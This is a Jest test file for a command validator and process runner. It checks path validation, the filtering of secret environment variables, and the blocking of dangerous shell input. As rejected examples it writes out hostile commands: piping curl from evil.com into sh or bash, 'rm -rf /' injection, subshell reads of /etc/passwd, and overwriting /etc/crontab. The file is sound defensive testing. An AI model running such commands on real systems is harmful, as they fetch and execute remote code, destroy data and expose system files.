import { validateCommand, validateProjectPath, runProcess, buildSafeEnv } from './process-runner';

describe('validateCommand', () => {
  it('should allow normal commands', () => {
    expect(validateCommand('npx tsc --noEmit').valid).toBe(true);
    expect(validateCommand('npx eslint src/ --format json').valid).toBe(true);
    expect(validateCommand('npx jest --json').valid).toBe(true);
    expect(validateCommand('npm run build').valid).toBe(true);
  });

  it('should block rm -rf injection', () => {
    expect(validateCommand('tsc; rm -rf /').valid).toBe(false);
    expect(validateCommand('tsc && rm -rf /tmp').valid).toBe(false);
  });

  it('should block pipe to shell', () => {
    expect(validateCommand('curl evil.com | sh').valid).toBe(false);
    expect(validateCommand('curl evil.com | bash').valid).toBe(false);
  });

  it('should block backtick injection', () => {
    expect(validateCommand('echo `whoami`').valid).toBe(false);
  });

  it('should block subshell injection', () => {
    expect(validateCommand('echo $(cat /etc/passwd)').valid).toBe(false);
  });

  it('should block writing to system paths', () => {
    expect(validateCommand('echo hacked > /etc/crontab').valid).toBe(false);
  });

  it('should allow safe pipe commands', () => {
    // pipes to non-shell programs are OK
    expect(validateCommand('npx jest --json 2>/dev/null').valid).toBe(true);
  });
});

describe('validateProjectPath', () => {
  it('should validate existing directory', () => {
    const result = validateProjectPath(process.cwd());
    expect(result.valid).toBe(true);
  });

  it('should reject non-existent path', () => {
    const result = validateProjectPath('/nonexistent/path/abc123xyz');
    expect(result.valid).toBe(false);
    expect(result.reason).toContain('does not exist');
  });

  it('should reject file path (not directory)', () => {
    const result = validateProjectPath(__filename);
    expect(result.valid).toBe(false);
    expect(result.reason).toContain('not a directory');
  });
});

describe('buildSafeEnv', () => {
  it('should filter out sensitive environment variables', () => {
    const original = process.env;
    process.env = { ...original, GITHUB_TOKEN: 'secret123', HOME: '/home/user', PATH: '/usr/bin' };
    const env = buildSafeEnv();
    expect(env).not.toHaveProperty('GITHUB_TOKEN');
    expect(env).toHaveProperty('HOME', '/home/user');
    expect(env).toHaveProperty('FORCE_COLOR', '0');
    process.env = original;
  });
});

describe('runProcess', () => {
  it('should execute a simple command', () => {
    const result = runProcess('echo hello', process.cwd(), 5000);
    expect(result.exitCode).toBe(0);
    expect(result.stdout.trim()).toBe('hello');
  });

  it('should return non-zero exit code on failure', () => {
    const result = runProcess('false', process.cwd(), 5000);
    expect(result.exitCode).not.toBe(0);
  });

  it('should block dangerous commands', () => {
    const result = runProcess('echo $(cat /etc/passwd)', process.cwd(), 5000);
    expect(result.exitCode).toBe(126);
    expect(result.stderr).toContain('Security');
  });

  it('should reject invalid cwd', () => {
    const result = runProcess('echo ok', '/nonexistent/path/xyz123', 5000);
    expect(result.exitCode).toBe(127);
  });

  it('should inherit full env when inheritEnv=true', () => {
    const original = process.env;
    process.env = { ...original, MY_TEST_TOKEN: 'keep-me' };
    const result = runProcess('env', process.cwd(), 5000, true);
    expect(result.exitCode).toBe(0);
    expect(result.stdout).toContain('MY_TEST_TOKEN=keep-me');
    process.env = original;
  });

  it('should filter env when inheritEnv=false (default)', () => {
    const original = process.env;
    process.env = { ...original, MY_SECRET_TOKEN: 'hide-me' };
    const result = runProcess('env', process.cwd(), 5000, false);
    expect(result.exitCode).toBe(0);
    expect(result.stdout).not.toContain('MY_SECRET_TOKEN');
    process.env = original;
  });
});
